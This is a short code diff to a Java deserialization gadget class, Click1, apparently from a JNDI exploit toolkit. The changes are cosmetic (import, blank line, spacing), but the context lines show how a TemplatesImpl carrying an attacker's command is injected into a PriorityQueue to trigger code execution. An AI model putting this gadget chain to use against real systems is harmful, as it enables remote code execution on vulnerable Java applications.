@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -11,7 +10,6 @@ import org.apache.click.control.Table;
 import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
-
 
 
 /**
@@ -71,7 +69,7 @@ public class Click1 implements ObjectPayload<Object> {
         // finally, we inject and new TemplatesImpl object into the queue,
         // so its getOutputProperties() method will be called
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        final Object template;
+        final Object   template;
         template = Gadgets.createTemplatesImpl(command);
         queueArray[0] = template;
         return queue;
